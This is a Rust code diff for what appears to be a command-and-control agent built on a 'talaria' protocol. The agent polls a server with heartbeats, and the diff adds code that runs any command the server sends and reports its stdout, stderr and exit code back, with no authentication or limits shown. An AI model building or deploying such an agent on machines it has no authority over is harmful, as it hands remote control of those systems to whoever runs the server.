@@ -1,31 +1,14 @@
-use std::error::Error;
+use std::process::{Command, Output};
 
-use reqwest::Client;
-use serde_json::json;
 use talaria::{AgentInstruction, AgentResponse, AgentResponseBody, PacketHeader};
 
-use crate::agent::Agent;
+use crate::agent::AgentContext;
 
-// async fn register_agent(
-//     client: &Client,
-//     backend_url: &str,
-//     info: &SystemInfo,
-// ) -> Result<(), reqwest::Error> {
-//     client
-//         .post(format!("{}/agent/{}/register", backend_url, info.id))
-//         .json(&json!({
-//             "id": info.id,
-//             "os": info.os,
-//             "ip": info.ip,
-//             "active": true
-//         }))
-//         .send()
-//         .await?;
-//     Ok(())
-// }
-
-async fn make_request(agent: &mut Agent, request: AgentResponse) -> Option<AgentInstruction> {
-    agent.send_log.push(request.clone());
+async fn make_request(
+    agent: &mut AgentContext,
+    request: AgentResponse,
+) -> Option<AgentInstruction> {
+    // agent.send_log.push(request.clone());
 
     let request = AgentResponse::serialize(&request);
     let response = agent
@@ -39,17 +22,17 @@ async fn make_request(agent: &mut Agent, request: AgentResponse) -> Option<Agent
         Ok(response) => {
             let bytes = response.bytes().await.unwrap();
             let instruction = AgentInstruction::deserialize(&bytes.to_vec());
-            agent.rec_log.push(Ok(instruction.clone()));
+            // agent.rec_log.push(Ok(instruction.clone()));
             Some(instruction)
         }
         Err(error) => {
-            agent.rec_log.push(Err(error));
+            // agent.rec_log.push(Err(error));
             None
         }
     }
 }
 
-pub async fn handle_response(agent: &mut Agent, response: AgentInstruction) {
+pub async fn handle_response(agent: &mut AgentContext, response: AgentInstruction) {
     match response.instruction {
         talaria::AgentInstructionBody::Command {
             ref command,
@@ -60,7 +43,27 @@ pub async fn handle_response(agent: &mut Agent, response: AgentInstruction) {
                 "Executing Command: {:?}, ID: {:?}, Args: {:?}",
                 command, command_id, args
             );
-            // Placeholder for actual command execution logic
+
+            // Spawn the command with provided arguments
+            let output: Output = Command::new(command).args(args).output().unwrap();
+
+            // Capture stdout, stderr, and status code
+            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+            let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available
+
+            let agent_response = AgentResponse {
+                packet_header: agent.generate_packet_header(),
+                packet_body: AgentResponseBody::CommandResponse {
+                    command: command.to_string(),
+                    command_id: *command_id,
+                    status_code,
+                    stdout,
+                    stderr,
+                },
+            };
+
+            make_request(agent, agent_response).await;
         }
         talaria::AgentInstructionBody::RequestHeartbeat => {
             println!("Received heartbeat request from server.");
@@ -73,7 +76,7 @@ pub async fn handle_response(agent: &mut Agent, response: AgentInstruction) {
     println!("Processed Response: {:#?}", response);
 }
 
-pub async fn send_heartbeat(agent: &mut Agent) -> Option<AgentInstruction> {
+pub async fn send_heartbeat(agent: &mut AgentContext) -> Option<AgentInstruction> {
     let response = talaria::AgentResponse {
         packet_header: agent.generate_packet_header(),
         packet_body: AgentResponseBody::Heartbeat,
@@ -81,31 +84,3 @@ pub async fn send_heartbeat(agent: &mut Agent) -> Option<AgentInstruction> {
 
     return make_request(agent, response).await;
 }
-//
-// pub async fn connect_and_listen() -> Result<(), Box<dyn std::error::Error>> {
-//     let server_url = "wss://your-public-server.com/socket";
-//     let backend_url = "https://your-backend-server.com"; // Replace with actual backend URL
-//     let client = Client::new();
-//
-//     // Register the agent with the backend server
-//     let system_info = agent::get_system_info().await?;
-//     register_agent(&client, backend_url, &system_info).await?;
-//
-//     let (mut socket, _response) = connect(Url::parse(server_url)?).expect("Failed to connect");
-//
-//     // Main loop to listen for commands from the server
-//     loop {
-//         // Send a heartbeat to the server periodically (e.g., every 60 seconds)
-//         send_heartbeat(&client, backend_url, system_info.id).await?;
-//
-//         if let Ok(msg) = socket.read_message() {
-//             if let Message::Text(command) = msg {
-//                 // Handle the command
-//                 if let Some(response) = commands::handle_command(&command) {
-//                     // Send the command output back to the server
-//                     socket.write_message(Message::Text(response)).unwrap();
-//                 }
-//             }
-//         }
-//     }
-// }
